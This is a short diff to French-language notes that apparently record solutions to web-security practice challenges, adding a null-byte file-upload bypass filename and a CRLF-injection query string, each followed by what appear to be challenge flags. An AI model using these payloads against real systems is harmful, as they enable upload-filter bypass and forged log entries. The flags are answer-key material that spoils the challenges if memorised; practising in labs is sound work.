@@ -88,4 +88,10 @@ hint: utiliser curl
 
 ## File upload - Null byte
 - utiliser le fichier nullbyte.php%00.png 
-- YPNchi2NmTwygr2dgCCF
+- YPNchi2NmTwygr2dgCCF 
+
+## CRLF
+
+- ?username=admin authenticated.%0D%0Aa&password=admin
+
+- rFSP&G0p&5uAg1%
